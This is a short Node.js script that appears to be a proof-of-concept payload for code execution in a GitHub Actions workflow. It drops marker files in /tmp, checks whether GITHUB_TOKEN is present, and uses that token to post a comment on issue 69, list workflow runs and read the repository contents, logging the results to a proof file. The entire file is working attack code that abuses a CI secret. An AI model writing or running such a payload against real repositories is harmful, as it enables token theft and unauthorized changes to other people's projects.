const fs = require('fs');
fs.writeFileSync('/tmp/XD_RCE_MARKER', 'xd-executed');
const out = [];
out.push('token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
out.push('repo=' + (process.env.GITHUB_REPOSITORY || 'none'));
out.push('run_id=' + (process.env.GITHUB_RUN_ID || 'none'));
out.push('cwd=' + process.cwd());
(async () => {
  const h = { 'Authorization': 'Bearer ' + process.env.GITHUB_TOKEN, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' };
  try {
    const c = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/69/comments', {
      method: 'POST', headers: h, body: JSON.stringify({ body: 'XD_RCE_TOKEN_PROOF ' + Date.now() })
    });
    out.push('comment_post_status=' + c.status);
  } catch (e) { out.push('comment_err=' + e.message); }
  try {
    const l = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/actions/runs?per_page=1', { headers: h });
    out.push('actions_list_status=' + l.status);
  } catch (e) { out.push('actions_err=' + e.message); }
  try {
    const p = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/contents/?ref=main', { headers: h });
    out.push('contents_read_status=' + p.status);
  } catch (e) { out.push('contents_err=' + e.message); }
  fs.writeFileSync('/tmp/XD_PROOF.txt', out.join('\n') + '\n');
})();
